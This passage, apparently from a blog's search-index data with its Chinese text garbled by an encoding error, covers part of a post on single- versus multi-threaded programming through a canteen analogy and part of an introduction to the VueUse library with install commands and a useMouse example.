302ç§’ï¼ŒCPUå·¥ä½œ7ç§’ï¼Œç©ºé–’295ç§’ã€‚\nå€¼æ—¥ç”Ÿå°å“¥ç›¸ç•¶æ–¼selectæ¨¡å‹ä¸­çš„selectåŠŸèƒ½ï¼Œè² è²¬è¼ªè©¢ä»»å‹™æ˜¯å¦å¯ä»¥å·¥ä½œï¼Œå¦‚æœå¯ä»¥å‰‡ç›´æ¥å·¥ä½œï¼Œå¦å‰‡ç¹¼çºŒè¼ªè©¢ã€‚\nåœ¨å°Aé˜»å¡çš„300ç§’è£é¢ï¼Œé˜¿å§¨(CPU)æ²’æœ‰å‚»ç­‰ï¼Œè€Œæ˜¯åœ¨æœå‹™å¾Œé¢çš„äººï¼Œä¹Ÿå°±æ˜¯å°Bå’Œå°Cï¼Œæ‰€ä»¥é€™è£èˆ‡æ¨¡å‹3ä¸åŒçš„æ˜¯ï¼Œé€™è£æœ‰5ç§’CPUæ˜¯å·¥ä½œçš„ã€‚\nå¦‚æœæ‰“é£¯çš„äººè¶Šå¤šï¼Œé€™ç¨®æ¨¡å‹CPUçš„åˆ©ç”¨ç‡è¶Šé«˜ï¼Œä¾‹å¦‚å¦‚æœæœ‰å°Dï¼Œå°Eï¼Œå°F\u0026hellip;ç­‰éœ€è¦æœå‹™ï¼ŒCPUå¯ä»¥åœ¨å°Aé˜»å¡çš„300ç§’æœŸé–“å…§ç¹¼çºŒæœå‹™å…¶ä»–äººã€‚å¯¦éš›ä¸Šå€¼æ—¥ç”Ÿå°å“¥è¼ªè©¢ä¹Ÿæœƒè€—æ™‚ï¼Œé€™å€‹è€—æ™‚æ˜¯å¾ˆå°‘çš„ï¼Œå¹¾ä¹å¯ä»¥å¿½ç•¥ä¸è¨ˆï¼Œä½†æ˜¯å¦‚æœä»»å‹™éå¸¸å¤šï¼Œé€™å€‹è¼ªè©¢é‚„æ˜¯æœƒå½±éŸ¿æ€§èƒ½çš„ï¼Œä½†æ˜¯epollæ¨¡å‹å·²ç¶“ä¸ä½¿ç”¨è¼ªè©¢çš„æ–¹å¼ï¼Œç›¸ç•¶æ–¼Aï¼ŒBï¼ŒCæœƒä¸»å‹•è·Ÿå€¼æ—¥ç”Ÿå°å“¥å ±å‘Šï¼Œèªªæˆ‘æº–å‚™å¥½äº†ï¼Œå¯ä»¥ç›´æ¥æ‰“èœäº†ã€‚\né€™ç¨®æ¨¡å¼ä¸‹ç”¨æˆ¶é«”é©—å¥½ï¼ŒCPUåˆ©ç”¨ç‡é«˜(ä»»å‹™è¶Šå¤šåˆ©ç”¨ç‡è¶Šé«˜)\nå–®ç·šç¨‹å¤šä»»å‹™ï¼Œæœ‰è€—æ™‚è¨ˆç®— å›åˆ°æœ€é–‹å§‹çš„æ¨¡å‹ï¼Œå¦‚ä¸‹ï¼š\né˜¿å§¨ï¼šæ‰“ä¸€å€‹èœéœ€è¦1ç§’ å°Aï¼š200å€‹èœ å°Bï¼š3å€‹èœ å°Cï¼š2å€‹èœ é †åºåšå®Œæ‰€æœ‰ä»»å‹™ï¼Œéœ€è¦è€—æ™‚ 200 + 3 + 2 = 205ç§’ï¼ŒCPUç„¡ç©ºé–’ï¼Œä½†æ˜¯ç”¨æˆ¶é«”é©—å»ä¸æ˜¯å¾ˆå¥½ï¼Œå› çˆ²é¡¯ç„¶å¾Œé¢çš„ Bã€C éœ€è¦ç­‰å¾…å°A 200ç§’çš„æ™‚é–“ï¼Œé€™ç¨®æƒ…æ³ä¸‹æ˜¯æ²’æœ‰IOé˜»å¡çš„ï¼Œä½†æ˜¯ä»»å‹™Aæœ¬èº«å¤ªè€—CPUäº†ï¼Œæ‰€ä»¥èªªå¦‚æœå–®ç·šç¨‹å‡ºç¾äº†è€—æ™‚çš„æ“ä½œï¼Œä¸€å®šæœƒå½±éŸ¿é«”é©—(IOæ“ä½œæˆ–è€…æ˜¯è€—æ™‚çš„è¨ˆç®—éƒ½å±¬æ–¼è€—æ™‚çš„æ“ä½œï¼Œéƒ½æœƒå°è‡´é˜»å¡ï¼Œä½†æ˜¯é€™å…©ç¨®å°è‡´é˜»å¡çš„æ€§è³ªæ˜¯ä¸ä¸€æ¨£çš„)ã€‚\nåœ¨æ‰€æœ‰çš„å–®ç·šç¨‹æ¨¡å‹ä¸­éƒ½ä¸å…è¨±å‡ºç¾é˜»å¡çš„æƒ…æ³ï¼Œå¦‚æœå‡ºç¾ï¼Œé‚£éº¼ç”¨æˆ¶é«”é©—æ˜¯æ¥µå·®çš„ï¼Œä¾‹å¦‚åœ¨UIç·¨ç¨‹ä¸­(QTã€C# Winform)æ˜¯ä¸å…è¨±åœ¨UIç·šç¨‹ä¸­åšè€—æ™‚çš„æ“ä½œçš„ï¼Œå¦å‰‡æœƒå°è‡´UIç•Œé¢ç„¡éŸ¿æ‡‰ã€‚ ç·¨å¯«Nodejsç¨‹åºçš„æ™‚å€™ï¼Œæˆ‘å€‘æ‰€å¯«çš„ä»£ç¢¼å¯¦éš›ä¸Šæ˜¯åœ¨ä¸€å€‹ç·šç¨‹ä¸­åŸ·è¡Œçš„ï¼Œæ‰€ä»¥ä¹Ÿä¸å…è¨±æœ‰é˜»å¡çš„æ“ä½œ(ç•¶ç„¶æ•´å€‹Nodejsæ¡†æ¶å¯¦ç¾ç•°æ­¥ï¼Œä¸€å®šä¸æ­¢ä¸€å€‹ç·šç¨‹)ã€‚\nå‡ºç¾é˜»å¡çš„æƒ…æ³ä¸€èˆ¬æœ‰2ç¨®ï¼Œä¸€ç¨®æ˜¯IOé˜»å¡ï¼Œä¾‹å¦‚å…¸å‹çš„å¦‚ç£ç›¤æ“ä½œï¼Œé€™ç¨®æƒ…æ³ä¸‹çš„é˜»å¡æœƒå°è‡´CPUç©ºé–’ç­‰å¾…(ç•¶ç„¶ç¾ä»£æ“ä½œç³»çµ±ä¸­å¦‚æœIOé˜»å¡ï¼Œæ“ä½œç³»çµ±ä¸€å®šæœƒå°‡å°è‡´IOé˜»å¡çš„ç·šç¨‹æ›èµ·)ã€‚é€™ç¨®é˜»å¡çš„æƒ…æ³ï¼Œå¯ä»¥é€šéç•°æ­¥IOçš„æ–¹æ³•é¿å…ï¼Œé€™æ¨£å°±é¿å…ç¨‹åºä¸­åƒ…æœ‰çš„å–®ç·šç¨‹è¢«æ“ä½œç³»çµ±æ›èµ·ã€‚å¦ä¸€ç¨®æƒ…æ³ä¸‹æ˜¯ç¢ºå¯¦æœ‰éå¸¸å¤šçš„è¨ˆç®—æ“ä½œï¼Œä¾‹å¦‚ä¸€å€‹è¤‡é›œçš„åŠ å¯†ç®—æ³•ï¼Œç¢ºå¯¦éœ€è¦æ¶ˆè€—éå¸¸å¤šçš„CPUæ™‚é–“ï¼Œé€™ç¨®æƒ…æ³ä¸‹CPUä¸¦ä¸æ˜¯ç©ºé–’çš„ï¼Œåè€Œæ˜¯å…¨è² è·å·¥ä½œçš„ã€‚\né€™ç¨®CPUå¯†é›†çš„å·¥ä½œä¸é©åˆæ”¾åœ¨å–®ç·šç¨‹ä¸­ï¼Œé›–ç„¶CPUçš„åˆ©ç”¨ç‡å¾ˆé«˜ï¼Œä½†æ˜¯ç”¨æˆ¶é«”é©—ä¸¦ä¸æ˜¯å¾ˆå¥½ã€‚é€™ç¨®æƒ…æ³ä¸‹ä½¿ç”¨å¤šç·šç¨‹åè€Œæœƒæ›´å¥½ï¼Œä¾‹å¦‚å¦‚æœ3å€‹ä»»å‹™ï¼Œæ¯å€‹ä»»å‹™éƒ½åœ¨ä¸€å€‹ç·šç¨‹ä¸­ï¼Œä¹Ÿå°±æ˜¯æœ‰3å€‹ç·šç¨‹ï¼ŒAä»»å‹™åœ¨ThreadAä¸­ï¼ŒBä»»å‹™åœ¨ThreadBä¸­ï¼ŒCä»»å‹™åœ¨ThreadCä¸­ï¼Œé‚£éº¼å³ä½¿Aä»»å‹™çš„è¨ˆç®—é‡æ¯”è¼ƒå¤§ï¼ŒBï¼ŒCå…©å€‹ä»»å‹™æ‰€åœ¨çš„ç·šç¨‹ä¹Ÿä¸å¿…ç­‰å¾…Aä»»å‹™å®Œæˆä¹‹å¾Œå†å·¥ä½œï¼Œä»–å€‘ä¹Ÿæœ‰æ©Ÿæœƒå¾—åˆ°èª¿åº¦ï¼Œé€™æ˜¯ç”±æ“ä½œç³»çµ±ä¾†å®Œæˆçš„ã€‚é€™æ¨£å°±ä¸æœƒå› çˆ²æŸä¸€å€‹ä»»å‹™è¨ˆç®—é‡å¤§ï¼Œè€Œå°è‡´é˜»å¡å…¶ä»–ä»»å‹™è€Œå½±éŸ¿é«”é©—äº†ã€‚\nå¤šç·šç¨‹ç¨‹åº æˆ‘å€‘å°‡ä¸Šé¢çš„æ¨¡å‹æ”¹é€ æˆå¤šç·šç¨‹çš„æ¨¡å‹æ˜¯æ€æ¨£çš„å‘¢ï¼Œæˆ‘å€‘åœ¨æ¨¡å‹5çš„åŸºç¤ä¸Šæ·»åŠ ä¸€å€‹è§’è‰²ï¼Œç®¡ç†å“¡å¤§å”(æ“ä½œç³»çµ±çš„è§’è‰²)ï¼š\né˜¿å§¨ï¼šæ‰“ä¸€å€‹èœéœ€è¦1ç§’ å°Aï¼š200å€‹èœ å°Bï¼š3å€‹èœ å°Cï¼š2å€‹èœ åŠ å…¥ç®¡ç†å“¡å¤§å”ä¹‹å¾Œè®Šæˆé€™æ¨£çš„äº†ï¼Œå°Aæ‰“å…©å€‹èœä¹‹å¾Œï¼Œå¤§å”èªªï¼Œä½ æ‰“çš„èœå¤ªå¤šäº†ï¼Œä¸èƒ½å› çˆ²ä½ è¦æ‰“200å€‹èœï¼Œè®“å¾Œé¢çš„åŒå­¸éƒ½æ²’æœ‰æ©Ÿæœƒæ‰“èœï¼Œä½ æ‰“å…©å€‹èœä¹‹å¾Œç­‰ä¸€æœƒï¼Œè®“å¾Œé¢çš„åŒå­¸ä¹Ÿæœ‰æ©Ÿæœƒã€‚\nå¤§å”è®“å°Bæ‰“å…©å€‹èœï¼Œç„¶å¾Œè®“å°Cæ‰“å…©å€‹èœ(å°Cå®Œæˆ)ï¼Œç„¶å¾Œå†è®“å°Aæ‰“å…©å€‹èœ(å®Œæˆä¹‹å¾Œå°Aç¸½å…±å°±æœ‰4å€‹èœäº†)ï¼Œå†è®“å°Bæ‰“1å€‹èœ(æ­¤æ™‚å°Bç¸½å…±æ‰“3å€‹èœï¼Œå®Œæˆ)ï¼Œç„¶å¾Œå°Aæ‰“å‰©ä¸‹çš„196å€‹èœã€‚\nCPUçš„åˆ©ç”¨ç‡ï¼šå¾ˆé«˜ï¼Œé˜¿å§¨åœ¨ä¸æ–·çš„å·¥ä½œã€‚\nç”¨æˆ¶é«”é©—ï¼šä¸éŒ¯ï¼Œå³ä½¿å°Aè¦æ‰“200å€‹èœï¼Œå°Bï¼Œå°Cä¹Ÿæœ‰æ©Ÿæœƒï¼›ç•¶ç„¶å¦‚æœå°Aèªªæˆ‘æ˜¯å¹«æ ¡é•·æ‰“èœï¼Œè¦å¿«ä¸€é»(ç·šç¨‹å„ªå…ˆç´šé«˜)ï¼Œé‚£ä¹Ÿåªèƒ½å…ˆæŠŠå°Aæœå‹™å®Œã€‚\nç¸½è€—æ™‚ï¼š 200 + 3 + 2 + (å¤§å”æŒ‡æ®å®‰æ’æ‰€æ¶ˆè€—çš„æ™‚é–“ï¼ŒåŒ…æ‹¬å¾å°Cåˆ‡æ›å›å°Açš„æ™‚å€™ï¼Œå¤§å”è¦çŸ¥é“å°Aä¸Šæ¬¡æ‰“çš„èœæ˜¯å“ªå…©å€‹ï¼Œé€™æ¬¡æ‡‰è©²æ¥ç€æ‰“ä»€éº¼èœï¼Œé€™ç›¸ç•¶æ–¼ç·šç¨‹ä¸Šä¸‹æ–‡åˆ‡æ›çš„é–‹éŠ·ä»¥åŠç·šç¨‹ç’°å¢ƒçš„ä¿å­˜èˆ‡æ¢å¾©)ï¼Œæ‰€ä»¥ä¸¦ä¸æ˜¯ç·šç¨‹è¶Šå¤šè¶Šå¥½ï¼Œç·šç¨‹éå¸¸å¤šçš„æ™‚å€™å¤§å”ä¼°è¨ˆæœƒç„¦é ­çˆ›é¡å§ï¼Œè¦è¨˜ä½é€™éº¼ç‹€æ…‹ï¼Œåˆ‡æ›ä¾†åˆ‡æ›å»ä¹Ÿè€—æ™‚é–“ã€‚\né€™ç¨®æ¨¡å‹ä¸‹å¯¦éš›ä¸Šæ˜¯å°‡å°Açš„è€—æ™‚ä»»å‹™ï¼Œåˆ†æˆå¤šä»½å»åŸ·è¡Œè€Œä¸æ˜¯é›†ä¸­åŸ·è¡Œï¼Œæ‰€ä»¥å°Aè¦å®Œæˆä»–çš„ä»»å‹™ï¼Œå¯èƒ½éœ€è¦æ›´å¤šçš„æ™‚é–“(æœŸé–“ä»–ä¹Ÿéœ€è¦ç­‰åˆ¥äººï¼Œé˜¿å§¨ä¸æœƒä¸€ç›´çˆ²ä»–ä¸€å€‹äººæœå‹™ï¼Œä½†æ˜¯é˜¿å§¨çˆ²ä»–æœå‹™çš„æ™‚é–“æ˜¯æ²’æœ‰è®ŠåŒ–çš„)ï¼Œé€™ç¨®å…¶å¯¦æœ‰é»ä»¥æ™‚é–“æ›å–ç”¨æˆ¶é«”é©—(å°Bå’Œå°ï¼£çš„é«”é©—ï¼Œå°ï¼¡çš„é«”é©—å¯èƒ½å°±ä¸æœƒé‚£éº¼å¥½äº†ï¼Œä½†æ˜¯å°ï¼¡æœ¬ä¾†ä¹Ÿéå¸¸è€—æ™‚ï¼Œæ‰€ä»¥å¤šç­‰ä¸€æœƒæ˜¯ä¸æ˜¯ä¹Ÿæ²’é—œä¿‚)ã€‚\né‚£éº¼IOé˜»å¡å’ŒCPUè¨ˆç®—è€—æ™‚é˜»å¡é€™å…©è€…æœ‰ä»€éº¼å€åˆ¥å‘¢ï¼Ÿ\nå€åˆ¥åœ¨æ–¼IOé˜»å¡æ˜¯ä¸ä½¿ç”¨CPUçš„ï¼Œè€ŒCPUè¨ˆç®—è€—æ™‚å°è‡´çš„é˜»å¡æ˜¯æœƒä½¿ç”¨CPUçš„ã€‚\nä¾‹å¦‚ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå°Aèªªå¿˜è¨˜å¸¶éŒ¢äº†éœ€è¦åŒå­¸é€éŒ¢ï¼Œæ–¼æ˜¯å°Aç­‰ç€åŒå­¸é€éŒ¢éä¾†ï¼Œé€™å€‹éç¨‹ä¸­é˜¿å§¨ä¸¦æ²’æœ‰çˆ²å°Aæä¾›æœå‹™ï¼Œé€™å€‹éç¨‹ä¸­çˆ²å°Aæä¾›æœå‹™çš„æ˜¯ä»–çš„åŒå­¸(é€éŒ¢éä¾†)ï¼Œå¯¦éš›ä¸Šå°Açš„åŒå­¸ç›¸ç•¶æ–¼ç¾ä»£è¨ˆç®—æ©Ÿç³»çµ±ä¸­çš„DMA(ç›´æ¥å…§å­˜æ“ä½œ)ï¼Œå°AåŒå­¸é€éŒ¢çš„éç¨‹ç›¸ç•¶æ–¼DMAå¾ç£ç›¤è®€å–æ•¸æ“šåˆ°å…§å­˜çš„éç¨‹ï¼Œé€™å€‹éç¨‹åŸºæœ¬ä¸éœ€è¦CPUå¹²é ã€‚\nç•¶ç„¶åœ¨DMAæŠ€è¡“é‚„æ²’æœ‰å‡ºç¾çš„å¹´ä»£ï¼Œå¾ç£ç›¤è®€å–æ–‡ä»¶ä¹Ÿæ˜¯éœ€è¦CPUç™¼é€æŒ‡ä»¤å»è®€å–çš„ï¼Œä¹Ÿå°±æ˜¯èªªéœ€è¦CPUçš„è¨ˆç®—ï¼Œæ‡‰ç”¨åˆ°é€™è£çš„å ´æ™¯ä¸­ï¼Œå°±æ˜¯é˜¿å§¨è¦ªè‡ªè·‘ä¸€è¶Ÿå¹«å°AæŠŠéŒ¢æ‹¿éä¾†ã€‚\nå¤šCPU å¤šCPUæ˜¯ä¸€å€‹æ›´åŠ è¤‡é›œçš„å•é¡Œï¼Œå¤šCPUå¦‚ä½•èª¿åº¦ï¼Ÿå°Aåœ¨ç¬¬ä¸€å€‹çª—å£æ‰“å…©å€‹èœï¼Œåˆè·‘åˆ°ç¬¬äºŒå€‹çª—å£æ‰“å…©å€‹èœé€™ç¨®æƒ…æ³å¦‚ä½•è™•ç†ï¼Ÿ\nå°Aåœ¨ç¬¬ä¸€å€‹çª—å£ï¼Œå°Båœ¨ç¬¬äºŒå€‹çª—å£ä»–å€‘è¦åŒä¸€å€‹èœï¼Œä½†æ˜¯é€™å€‹èœåªå¤ ä¸€å€‹äººï¼Œé‚£éº¼å…©å€‹çª—å£é˜¿å§¨å¦‚ä½•åˆ†é…é€™ç¨®éœ€æ±‚(å¯¦éš›ä¸Šæ‡‰è©²æ˜¯ç”±æ“ä½œç³»çµ±ä¹Ÿå°±æ˜¯ç®¡ç†å“¡å¤§å”ä¾†æ±ºå®šå¦‚ä½•åˆ†é…ï¼Œä¹Ÿå°±æ˜¯å¤šæ ¸ä¸‹çš„ç·šç¨‹åŒæ­¥èˆ‡äº’æ–¥)ï¼Ÿ\nå¤šæ ¸CPUæƒ…æ³ä¸‹ï¼Œå¤šç·šç¨‹çš„èª¿åº¦ã€äº’æ–¥ã€é–èˆ‡åŒæ­¥ç›¸å°ä¾†è¬›æ›´åŠ è¤‡é›œï¼Œå¤šæ ¸æƒ…æ³ä¸‹æ˜¯çœŸæ­£çš„ä¸¦è¡Œï¼ŒåŒä¸€æ™‚åˆ»æœ‰å¤šå€‹ç·šç¨‹åœ¨åŒæ™‚é‹è¡Œï¼Œä»–å€‘çš„ç«¶çˆ­æ€éº¼è™•ç†ï¼Œå¤šå€‹CPUä¹‹é–“å¦‚ä½•åŒæ­¥(å¤šCPUä¹‹é–“çš„ç·©å­˜ç‹€æ…‹ä¸€è‡´æ€§)ç­‰ç­‰ä¸€ç³»åˆ—çš„å•é¡Œã€‚\nå¤šç·šç¨‹èˆ‡å¤šé€²ç¨‹ ä¸Šé¢æè¿°çš„å¤šç·šç¨‹å¯¦éš›ä¸Šæ˜¯è¨è«–çš„æ˜¯å¤šç·šç¨‹çš„èª¿åº¦å•é¡Œï¼Œé€™è£æˆ‘å€‘èªªä¸€èªªå¤šç·šç¨‹èˆ‡å¤šé€²ç¨‹èˆ‡è³‡æºçš„åˆ†é…å•é¡Œã€‚ä»€éº¼æ„æ€å‘¢ï¼Œä¸€ç¾¤äºº(å¤šå€‹ç·šç¨‹)åœ¨ä¸€å€‹æ¡Œå­(é€²ç¨‹)ä¸Šåƒé£¯ï¼Œä»–å€‘æœƒæ¶‰åŠåˆ°ä¸€äº›å•é¡Œï¼Œæ¯”å¦‚å¤šå€‹äººå¯èƒ½æœƒå¤¾ä¸€å€‹èœ(ç«¶çˆ­)ï¼ŒAå’ŒBåŒæ™‚çœ‹åˆ°ç›¤å­è£é¢æœ‰ä¸€å¡Šè‚‰ï¼ŒåŒæ™‚ä¼¸å‡ºç­·å­å»å¤¾ï¼ŒAå…ˆå¤¾èµ°ï¼ŒBé²äº†ä¸€é»ä¼¸åˆ°ç›¤å­çš„æ™‚å€™å·²ç¶“æ²’äº†ï¼Œåªèƒ½ç¸®å›ä¾†(è‡¨ç•Œè³‡æºï¼Œäº’æ–¥)ï¼Œæœ‰ä¸€å€‹é»å¿ƒéœ€è¦ç”¨é¥ƒå¤¾è‚‰ä¸€èµ·åƒã€‚Aå¤¾äº†è‚‰ï¼ŒBå¤¾äº†é¥ƒï¼ŒAéœ€è¦Bçš„é¥ƒï¼ŒBéœ€è¦Açš„è‚‰ï¼Œä»–å€‘åƒµæŒä¸ä¸‹èª°éƒ½ä¸è®“æ­¥(æ­»é–)ã€‚\nå¤šç·šç¨‹ä¹‹é–“çš„è³‡æºå…±äº«æ˜¯éå¸¸æ–¹ä¾¿çš„ï¼Œå› çˆ²ä»–å€‘å…±ç”¨é€²ç¨‹çš„è³‡æºç©ºé–“(åœ¨ä¸€å€‹æ¡Œå­ä¸Š)ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„ä¸€ç³»åˆ—çš„å•é¡Œï¼šç«¶çˆ­ã€æ­»é–ã€åŒæ­¥\u0026hellip;ç­‰ã€‚å¦‚æœåœ¨æ—é‚Šå†é–‹ä¸€å€‹æ¡Œå­(é€²ç¨‹)ã€‚ é‚£éº¼æ¡Œå­ä¹‹é–“è¬›è©±ï¼Œéæ±è¥¿åˆä¸æ–¹ä¾¿(é€²ç¨‹é–“é€šä¿¡)ï¼Œè€Œé–‹ä¸€å€‹æ¡Œå­çš„é–‹éŠ·æ¯”åœ¨ä¸€å€‹æ¡Œå­ä¸Šå¤šåŠ ä¸€å€‹äººçš„é–‹éŠ·è¦å¤§ã€‚å¦å¤–ä¸€å€‹æ¡Œå­ä¸Šçš„äººæ•¸ä¸å¯èƒ½ç„¡é™åˆ¶å¢åŠ ï¼Œæ¡Œå­çš„å®¹é‡æœ‰é™ä¹Ÿåä¸ä¸‹é€™éº¼å¤šäºº(é€²ç¨‹çš„ç·šç¨‹å¥æŸ„æ˜¯æœ‰é™åˆ¶çš„)ã€‚ä¸€å€‹æ¡Œå­å£äº†ä¸æœƒå½±éŸ¿åˆ°å¦ä¸€å€‹æ¡Œå­ä¸Šé¢äººçš„å°±é¤æƒ…æ³(é€²ç¨‹é–“ç›¸äº’DuLiï¼Œä¸€å€‹é€²ç¨‹å´©æ½°ä¸æœƒå½±éŸ¿å¦ä¸€å€‹)ï¼Œè€Œä¸€å€‹æ¡Œå­ä¸Šçš„æŸäººå–æ›äº†éœ€è¦é€é†«é™¢ï¼Œä¼°è¨ˆé€™ä¸€æ¡Œäººéƒ½è¦æ•£äº†(ç·šç¨‹æ›æ‰æœƒå°è‡´æ•´å€‹é€²ç¨‹ä¹Ÿæ›æ‰)ã€‚æ‰€ä»¥å¤šç·šç¨‹èˆ‡å¤šé€²ç¨‹æ˜¯å„æœ‰å„ªç¼ºé»ï¼Œä¸èƒ½ä¸€æ¦‚è€Œè«–ã€‚\nç¸½çµ å–®ç·šç¨‹ç¨‹åºï¼šé©åˆIOç•°æ­¥ï¼Œä¸èƒ½é˜»å¡ï¼Œä¸èƒ½æœ‰å¤§é‡è€—CPUçš„è¨ˆç®—ï¼Œå…¸å‹å¦‚Nodejsï¼Œé‚„æœ‰ä¸€äº›ç¶²çµ¡ç¨‹åºã€‚\n","date":"2023-01-07T00:00:00Z","image":"https://live.staticflickr.com/65535/52611539777_c564013cbd_o.png","permalink":"https://wayneblog.ga/2023-01-07/single-multi-thread/","title":"ä»¥ç”Ÿæ´»çš„ä¾‹å­èªªæ˜å–®ç·šç¨‹å’Œå¤šç·šç¨‹"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nVueUse æ˜¯ä»€éº¼ï¼Ÿ VueUse ä½œè€…ç‚º Anthony Fuï¼Œæ˜¯ä¸€æ¬¾åŸºæ–¼ Vue çµ„åˆå¼ API (Composition API) çš„å‡½æ•¸å·¥å…·é›†ï¼Œå…¶ä¸­ VueUse ä¸»è¦ç‰¹è‰²å¯ä»¥åˆ†ç‚ºä»¥ä¸‹å¹¾é»ï¼š\nVue 2 å’Œ Vue 3 éƒ½æ”¯æ´ æ¡å– Tree Shaking çµæ§‹ï¼Œåªæœƒæ‰“åŒ…å¼•å…¥çš„ç¨‹å¼ç¢¼ æ”¯æŒå„ç¨®å¥—ä»¶ å¯é…ç½®äº‹ä»¶éæ¿¾å™¨å’Œç›®æ¨™ ä»¥ä¸Šæ˜¯å®˜æ–¹ç¶²ç«™é—œæ–¼å®ƒçš„å®šç¾©ã€‚\né¦–å…ˆï¼Œå®ƒåŸºæ–¼ Vue Composition API (çµ„åˆå¼API)ï¼Œåªæœ‰åœ¨æ”¯æŒçµ„åˆå¼ API çš„ç’°å¢ƒä¸‹ï¼Œæ‰å¯ä»¥æ­£å¸¸ä½¿ç”¨å®ƒã€‚\nä»€éº¼æ˜¯çµ„åˆå¼ APIï¼Ÿ\nç„¶å¾Œï¼Œå®ƒæ˜¯ä¸€æ¬¾å‡½æ•¸å·¥å…·é›†(å¯é¡æ¯”ç‚º lodash.js / ramda.js)\nç°¡å–®ä¾†èªªï¼Œé€™æ˜¯ä¸€å€‹èƒ½è®“ä½ æ›´æ—©ä¸‹ç­çš„å·¥å…·åº«ã€‚\nVueUse é–‹æºå—ï¼Ÿç¾ç‹€å¦‚ä½•ï¼Ÿ ç•¶ç„¶é–‹æºï¼ github/vueuse\nç¤¾å€æ´»èºåº¦ï¼šç¤¾å€éå¸¸æ´»èºï¼Œæˆªæ­¢ 2021 å¹´ 11 æœˆï¼Œä¸€ç›´æœ‰ mr è¢«åˆå…¥ä¸»ç·šã€‚\nè¢«å¼•ç”¨æƒ…æ³ï¼šæˆªæ­¢ 2021 å¹´ 11 æœˆ 13 æ—¥ï¼Œnpm ä¸Šå¯æŸ¥è©¢åˆ°ä¾è³´å®ƒçš„åº«å°±æœ‰ 172 å€‹ï¼Œå…¶ä¸­åŒ…æ‹¬è‘—åUIåº«ï¼šElement-Plus\nVue çš„è‘—åé–‹æºä½œè€… Evan You ä¹Ÿæ˜¯æ­¤åº«çš„é‡‘ç‰Œè´ŠåŠ©å•†ã€‚\nå®‰è£ VueUse NPM æˆ– YARNï¼š\n1 2 3 npm i @vueuse/core # or yarn add @vueuse/core CDN å¼•å…¥ï¼š\né€™é‚Šæ³¨æ„ shared ä¸€å®šè¦åœ¨å‰é¢\n1 2 \u0026lt;script src=\u0026#34;https://unpkg.com/@vueuse/shared\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/@vueuse/core\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; æ³¨ï¼šVueUse å€ŸåŠ© vue-demi çš„å¼·å¤§åŠŸèƒ½ï¼Œå¯ä»¥åœ¨ä¸€å€‹åŒ…ä¸­åŒæ™‚é©ç”¨æ–¼ Vue 2ã€3ï¼\nVue 3 Demo\nä½¿ç”¨ Vite ä½¿ç”¨ Webpack Vue 2 Demo (Vue CLI)\nä½¿ç”¨ Vue CLI å¦å¤–ï¼Œè¦æ³¨æ„åº«çš„ç‰ˆæœ¬ï¼š\nå¾ v6.0 ç‰ˆæœ¬èµ·ï¼Œvue3 éœ€è¦ vue \u0026gt;= v3.2ï¼Œvue2 éœ€è¦ä¾è³´ @vue/composition-apiï¼š@vue/composition \u0026gt;= v1.1ã€‚\nVueUse èƒ½åšä»€éº¼ï¼Ÿ èƒ½åšçš„é‚£å¯å¤ªå¤šäº†ï¼Œä½†ç¸½é«”ä¸Šåˆ†ç‚ºä»¥ä¸‹å¹¾å€‹é¡åˆ¥æä¾›å·¥å…·å‡½æ•¸ï¼š\nAnimation å‹•ç•« Browser ç€è¦½å™¨ Component çµ„ä»¶ Formatters æ ¼å¼åŒ– Sensors å‚³æ„Ÿå™¨ State ç‹€æ…‹æ©Ÿ Utility å¯¦ç”¨æ–¹æ³• Watch ç›£è½ Misc å„å¼å„æ¨£çš„é›œé … é€™éº¼åˆ—äº†ä¸€éï¼Œä¼°è¨ˆä½ é‚„æ˜¯å¾ˆæ‡µï¼Œä½†å› ç‚ºæ–¹æ³•å¯¦åœ¨å¤ªå¤šï¼Œä¹Ÿä¸å¯èƒ½ä¸€å€‹å€‹éƒ½åˆ—å‡ºä¾†ã€‚\né‚£æˆ‘å°±èˆ‰å¹¾å€‹æœ‰ä»£è¡¨æ€§çš„ä¾‹å­ï¼Œå¸¶ä½ å¿«é€Ÿç†è§£é€™äº›æ–¹æ³•å¤§æ¦‚æ˜¯åšä»€éº¼çš„ï¼Œæœ‰ä»€éº¼ç‰¹é»ã€‚\nä¾‹å­(ä¸€)ï¼šuseMouse 1 2 3 4 5 6 7 8 9 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Mouse: {{x}} x {{y}}\u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; import { useMouse } from \u0026#39;@vueuse/core\u0026#39; const { x, y } = useMouse() \u0026lt;/script\u0026gt; æ•ˆæœï¼š\nWooooow~~~ é€™å¯å¤ªç°¡å–®æ˜“ç”¨äº†ï¼\nç¶“éæºç¢¼é–±è®€ï¼Œæˆ‘å€‘å¯ä»¥ç™¼ç¾ï¼Œé€™çŸ­çŸ­çš„ä¸€å€‹æ–¹æ³•ï¼Œè‡³å°‘åšäº†ä»¥ä¸‹é€™äº›äº‹ï¼š\nå‰µå»ºäº† x å’Œ y é€™å…©å€‹éŸ¿æ‡‰å¼å°è±¡(Ref) çµ¦ window æ·»åŠ äº†é¼ æ¨™äº‹ä»¶ç›£è½ï¼Œå°‡é¼ æ¨™çš„åæ¨™å¯¦æ™‚è³¦çµ¦ xã€y (ä¸¦ä¸”é‚„åšäº†ç§»å‹•ç«¯å…¼å®¹) å¦‚æœé€™äº›é‚è¼¯æ”¾åˆ°é é¢è£¡ï¼Œè‡³å°‘éœ€è¦ 6 è¡Œä»£ç¢¼ï¼Œé€™äº›ä»£ç¢¼å¾ŒæœŸéƒ½æœƒå¢åŠ ç¶­è­·äººå“¡ç†è§£é é¢çš„æˆæœ¬ï¼Œè€Œç¾åœ¨ï¼Œä½ åªéœ€è¦ä¸€è¡Œä»£ç¢¼ã€‚\né™¤æ­¤ä¹‹å¤–ï¼Œè©²æ–¹æ³•é‚„æœ‰çµ„ä»¶å¼ç”¨æ³•ï¼Œé©åˆæ›´ç†±æ„›æ¨™ç±¤çš„ç›†å‹\n1 2 3 4 \u0026lt;UseMouse v-slot=\u0026#34;{ x, y }\u0026#34;\u0026gt; x: {{ x }} y: {{ y }} 